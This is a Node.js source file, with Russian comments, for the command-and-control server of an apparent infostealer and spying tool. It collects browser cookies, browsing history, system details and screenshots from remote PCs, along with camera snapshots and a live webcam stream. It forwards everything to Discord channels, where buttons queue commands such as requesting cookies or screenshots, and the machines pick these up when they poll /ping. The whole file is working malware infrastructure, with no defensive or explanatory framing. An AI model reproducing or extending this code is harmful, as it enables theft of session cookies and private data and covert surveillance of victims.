import express from "express";
import { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } from "discord.js";
import { WebSocketServer } from "ws";
import http from "http";
import { fileURLToPath } from "url";
import { dirname, join } from "path";

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
app.use(express.json({ limit: "100mb" })); // убрал лимит на размер JSON

// ---------- Конфиг ----------
const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;
const CATEGORY_NAME = "Все ПК";
const CAMERA_CATEGORY = "Камеры";
const ONLINE_TIMEOUT = 3 * 60 * 1000; // 3 мин

const LOG_CATEGORY = "Логи";
const LOG_CHANNEL = "server-logs";

// интервалы (можно регулировать)
const PC_DISCORD_UPLOAD_INTERVAL = 60 * 1000; // не отправлять файлы от одного ПК чаще, чем раз в 60s
const CAMERA_DISCORD_UPLOAD_INTERVAL = 30 * 1000; // не отправлять снимки камеры в Discord чаще чем раз в 30s
const LOG_THROTTLE_DEFAULT = 60 * 1000; // не логировать одинаковые события чаще чем раз в 60s

// ---------- Состояние ----------
const onlinePCs = {};           // pcId -> timestamp
const pendingCommands = {};     // pcId -> array of commands
const channelByPC = {};         // pcId -> channelId
const wsCameraClients = {};     // camId -> array ws для live-камеры

// локальные хранилища для троттлинга
const camLastUpload = {};       // camId -> timestamp
const pcFileLastSent = {};      // pcId -> timestamp
const lastLogTimestamps = {};   // arbitrary key -> timestamp

let logCategoryCache = null;
let logChannelCache = null;
let categoryCacheByGuild = new Map(); // guildId -> { name -> category }
let channelCacheByGuild = new Map();  // guildId -> { channelName -> channel }

// ---------- Discord Bot ----------
const bot = new Client({ intents: [GatewayIntentBits.Guilds] });
bot.once("ready", () => console.log(`✅ Бот вошёл как ${bot.user.tag}`));

// ---------- Утилиты ----------
function sanitizeChannelName(name){
    return name.toLowerCase().replace(/[^a-z0-9-_]/g, '-').replace(/-+/g, '-').slice(0, 90) || 'channel';
}

async function throttleLog(key, minIntervalMs=LOG_THROTTLE_DEFAULT){
    const now = Date.now();
    const last = lastLogTimestamps[key] || 0;
    if(now - last < minIntervalMs) return false;
    lastLogTimestamps[key] = now;
    return true;
}

// Универсальная функция логирования с троттлингом по ключу (если key передан)
async function logToDiscord(msg, key = null, minIntervalMs = LOG_THROTTLE_DEFAULT){
    try{
        if(key){
            const allowed = await throttleLog(key, minIntervalMs);
            if(!allowed) return; // пропускаем логирование, чтобы не флудить
        }
        const guild = await bot.guilds.fetch(GUILD_ID);
        const channel = await getOrCreateLogChannel(guild);
        await channel.send(`[${new Date().toISOString()}] ${msg}`);
    }catch(e){
        console.error("Ошибка логирования в Discord:", e);
    }
}

// ---------- Категории и каналы (улучшенный кэш) ----------
async function getOrCreateCategory(guild, name){
    const gid = guild.id;
    if(!categoryCacheByGuild.has(gid)) categoryCacheByGuild.set(gid, {});
    const cache = categoryCacheByGuild.get(gid);
    if(cache[name]) return cache[name];

    const channels = await guild.channels.fetch();
    const matches = channels.filter(c => c.type === ChannelType.GuildCategory && c.name === name);

    if(matches.size>1){
        const sorted = [...matches.values()].sort((a,b)=>b.createdTimestamp-a.createdTimestamp);
        const keep = sorted[0];
        const toDelete = sorted.slice(1);
        for(const cat of toDelete) try{ await cat.delete(); } catch(e){ console.error(e); }
        cache[name] = keep;
        return keep;
    }
    if(matches.size===1){ cache[name] = matches.first(); return matches.first(); }
    const created = await guild.channels.create({name, type:ChannelType.GuildCategory});
    cache[name] = created;
    return created;
}

async function getOrCreateTextChannel(guild, name, parentId){
    const gid = guild.id;
    if(!channelCacheByGuild.has(gid)) channelCacheByGuild.set(gid, {});
    const cache = channelCacheByGuild.get(gid);
    const cacheKey = `${name}::${parentId}`;
    if(cache[cacheKey]) return cache[cacheKey];

    const channels = await guild.channels.fetch();
    const matches = channels.filter(c => c.type===ChannelType.GuildText && c.name===name && c.parentId===parentId);
    if(matches.size>1){
        const sorted = [...matches.values()].sort((a,b)=>b.createdTimestamp-a.createdTimestamp);
        const keep = sorted[0];
        const toDelete = sorted.slice(1);
        for(const ch of toDelete) try{ await ch.delete(); } catch(e){ console.error(e); }
        cache[cacheKey] = keep;
        return keep;
    }
    if(matches.size===1){ cache[cacheKey] = matches.first(); return matches.first(); }
    const created = await guild.channels.create({name, type:ChannelType.GuildText, parent:parentId});
    cache[cacheKey] = created;
    // логируем создание канала, но троттлим по имени
    await logToDiscord(`Создан канал ${name} в категории ${parentId}`, `channel_created:${name}`, 5*60*1000);
    cache[cacheKey] = created;
    return created;
}

// ---------- Получение канала логов ----------
async function getOrCreateLogChannel(guild){
    if(logChannelCache) return logChannelCache;
    const category = logCategoryCache || await getOrCreateCategory(guild, LOG_CATEGORY);
    logCategoryCache = category;

    const channels = await guild.channels.fetch();
    const matches = channels.filter(c=>c.type===ChannelType.GuildText && c.name===LOG_CHANNEL && c.parentId===category.id);
    let channel;
    if(matches.size>0) channel = matches.first();
    else channel = await guild.channels.create({ name:LOG_CHANNEL, type:ChannelType.GuildText, parent:category.id });
    logChannelCache = channel;
    return channel;
}

// ---------- Кнопки ----------
function createControlButtons(pcId) {
    const safePcId = encodeURIComponent(pcId);
    return [new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`check_online|${safePcId}`).setLabel("Чек онлайн").setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`get_cookies|${safePcId}`).setLabel("Запросить куки").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`get_history|${safePcId}`).setLabel("Запросить историю").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`get_system|${safePcId}`).setLabel("Системная инфо").setStyle(ButtonStyle.Secondary),
        new ButtonBuilder().setCustomId(`get_screenshot|${safePcId}`).setLabel("Скриншот").setStyle(ButtonStyle.Secondary)
    )];
}

// ---------- Обработка кнопок ----------
bot.on("interactionCreate", async interaction => {
    if(!interaction.isButton()) return;
    const [command, encodedPcId] = interaction.customId.split("|");
    const pcId = decodeURIComponent(encodedPcId);
    const lastPing = onlinePCs[pcId];
    const isOnline = lastPing && (Date.now() - lastPing < ONLINE_TIMEOUT);

    const replyOptions = { ephemeral: true };
    if(command === "check_online") {
        replyOptions.content = isOnline ? `✅ ПК ${pcId} онлайн` : `❌ ПК ${pcId} оффлайн`;
        await interaction.reply(replyOptions);
        return;
    }

    if(!isOnline){
        replyOptions.content = `❌ ПК ${pcId} оффлайн`;
        await interaction.reply(replyOptions);
        return;
    }

    if(!pendingCommands[pcId]) pendingCommands[pcId] = [];
    pendingCommands[pcId].push(command);
    replyOptions.content = `✅ Команда "${command}" отправлена ПК ${pcId}`;
    await interaction.reply(replyOptions);
});

// ---------- Логика отправки данных от ПК ----------
app.post("/upload-pc", async (req,res)=>{
    try{
        const { pcId, cookies, history, systemInfo, screenshot } = req.body;
        if(!pcId) return res.status(400).json({error:"pcId required"});

        const isNewPc = !onlinePCs[pcId];
        onlinePCs[pcId] = Date.now();

        const guild = await bot.guilds.fetch(GUILD_ID);
        const category = await getOrCreateCategory(guild, CATEGORY_NAME);
        const channel = channelByPC[pcId] ? await guild.channels.fetch(channelByPC[pcId]).catch(()=>null) : null;
        const finalChannel = channel || await getOrCreateTextChannel(guild, sanitizeChannelName(pcId), category.id);
        channelByPC[pcId] = finalChannel.id;

        // троттлинг по отправке файлов в канал от одного ПК
        const now = Date.now();
        const lastSent = pcFileLastSent[pcId] || 0;
        const shouldSendFiles = (now - lastSent) > PC_DISCORD_UPLOAD_INTERVAL;

        const files = [];
        if(shouldSendFiles){
            if(cookies) files.push({ attachment: Buffer.from(JSON.stringify(cookies, null, 2)), name:`${pcId}-cookies.json` });
            if(history) files.push({ attachment: Buffer.from(JSON.stringify(history, null, 2)), name:`${pcId}-history.json` });
            if(systemInfo) files.push({ attachment: Buffer.from(JSON.stringify(systemInfo, null, 2)), name:`${pcId}-system.json` });
            if(screenshot) files.push({ attachment: Buffer.from(screenshot, "base64"), name:`${pcId}-screenshot.jpeg` });
        }

        if(files.length) {
            await finalChannel.send({ files, components: createControlButtons(pcId) }).catch(e=>console.error(e));
            pcFileLastSent[pcId] = now;
            await logToDiscord(`📁 Данные ПК ${pcId} отправлены в канал ${finalChannel.name}`, `pc_upload:${pcId}`, 30*1000);
        } else {
            // если файлы троттлятся, отправим краткое обновление статуса (без вложений)
            await finalChannel.send({ content: `🟢 ПК ${pcId} обновлён (таймстамп: ${new Date().toISOString()})`, components: createControlButtons(pcId) }).catch(e=>console.error(e));
        }

        if(isNewPc) await logToDiscord(`🖥 Новый ПК зарегистрирован: ${pcId}`, `pc_registered:${pcId}`, 5*60*1000);

        res.json({success:true});
    }catch(e){
        await logToDiscord(`❌ Ошибка upload-pc: ${e.message}`, `error:upload-pc`, 10*1000);
        res.status(500).json({error:e.message});
    }
});

// ---------- Логика для камер ----------
app.post("/upload-cam", async (req,res)=>{
    try{
        const { camId, screenshot } = req.body;
        if(!camId || !screenshot) return res.status(400).json({ error:"camId and screenshot required" });

        // уведомляем ws клиенты всегда (для live view)
        if(wsCameraClients[camId]){
            wsCameraClients[camId].forEach(ws=>{
                try{ ws.send(screenshot); }catch(e){}
            });
        }

        const now = Date.now();
        const last = camLastUpload[camId] || 0;
        const shouldSendToDiscord = (now - last) > CAMERA_DISCORD_UPLOAD_INTERVAL;
        camLastUpload[camId] = now;

        // Троттлим лог регистрации камеры
        await logToDiscord(`📷 Камера активна: ${camId}`, `cam_active:${camId}`, 5*60*1000);

        if(shouldSendToDiscord){
            try{
                const guild = await bot.guilds.fetch(GUILD_ID);
                const category = await getOrCreateCategory(guild, CAMERA_CATEGORY);
                const channelName = sanitizeChannelName(camId);
                const channel = await getOrCreateTextChannel(guild, channelName, category.id);

                const buffer = Buffer.from(screenshot, "base64");
                await channel.send({ files: [{ attachment: buffer, name: `${camId}.jpg` }] }).catch(e=>console.error(e));
                await logToDiscord(`📷 Снимок камеры ${camId} отправлен в ${channel.name}`, `cam_snapshot_sent:${camId}`, 30*1000);
            }catch(e){
                console.error("Ошибка отправки снимка камеры в Discord:", e);
            }
        }

        res.json({success:true});
    }catch(e){
        await logToDiscord(`❌ Ошибка upload-cam: ${e.message}`, `error:upload-cam`, 10*1000);
        res.status(500).json({error:e.message});
    }
});

// ---------- Ping ----------
app.post("/ping", (req,res)=>{
    const { pcId } = req.body;
    if(!pcId) return res.status(400).json({error:"pcId required"});
    onlinePCs[pcId] = Date.now();
    const commands = pendingCommands[pcId] || [];
    pendingCommands[pcId] = [];
    res.json({commands});
});

app.post("/ping-cam", (req,res)=>{
    const { camId } = req.body;
    if(!camId) return res.status(400).json({error:"camId required"});
    res.json({success:true});
});

// ---------- API фронта ----------
app.get("/api/online-pcs", (req,res)=> res.json(Object.keys(onlinePCs)));

// ---------- Статика ----------
app.use(express.static(join(__dirname,"public")));

// ---------- WebSocket ----------
const wss = new WebSocketServer({ noServer: true });
wss.on("connection", (ws, req)=>{
    const url = new URL(req.url, `http://${req.headers.host}`);
    const camId = url.searchParams.get("camId");
    if(!camId) return ws.close();
    if(!wsCameraClients[camId]) wsCameraClients[camId] = [];
    wsCameraClients[camId].push(ws);

    ws.on("close", ()=>{
        wsCameraClients[camId] = wsCameraClients[camId].filter(c=>c!==ws);
    });
});

// ---------- HTTP Server ----------
const server = http.createServer(app);
server.on("upgrade", (request, socket, head)=>{
    wss.handleUpgrade(request, socket, head, ws => wss.emit("connection", ws, request));
});

const PORT = process.env.PORT || 3000;
server.listen(PORT,()=>console.log(`🚀 Сервер слушает порт ${PORT}`));
bot.login(DISCORD_BOT_TOKEN);

// ---------- Логи ошибок Node ----------
process.on("uncaughtException", e=> logToDiscord(`💥 Uncaught Exception: ${e.message}`, `uncaught:${e.message}`, 10*1000));
process.on("unhandledRejection", e=> logToDiscord(`💥 Unhandled Rejection: ${e}`, `unhandled:${String(e)}`, 10*1000));
